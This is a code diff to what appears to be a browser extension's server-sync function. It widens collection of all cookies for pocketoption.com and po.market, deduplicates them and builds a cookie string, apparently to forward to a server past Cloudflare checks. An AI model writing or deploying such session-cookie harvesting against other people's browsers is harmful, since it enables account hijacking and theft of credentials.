@@ -85,13 +85,22 @@ async function syncToServer(data) {
     // Capture all cookies from pocketoption.com and po.market
     let cookieString = "";
     try {
-      const domains = ["pocketoption.com", "po.market"];
+      // ✅ IMPROVED: Capture all variations of domains to ensure Cloudflare cookies are caught
+      const domains = [".pocketoption.com", "pocketoption.com", ".po.market", "po.market"];
       const allCookies = [];
       for (const domain of domains) {
         const cookies = await chrome.cookies.getAll({ domain });
         allCookies.push(...cookies);
       }
-      cookieString = allCookies.map(c => `${c.name}=${c.value}`).join("; ");
+      // Deduplicate by name
+      const uniqueCookies = Array.from(new Map(allCookies.map(c => [c.name, c])).values());
+      cookieString = uniqueCookies.map(c => `${c.name}=${c.value}`).join("; ");
+      
+      if (uniqueCookies.length === 0) {
+        console.warn("[BRIDGE] No cookies found for domains. Cloudflare check might fail.");
+      } else {
+        console.log(`[BRIDGE] Captured ${uniqueCookies.length} unique cookies.`);
+      }
     } catch (cookieErr) {
       console.error("[BRIDGE] Failed to capture cookies:", cookieErr.message);
     }
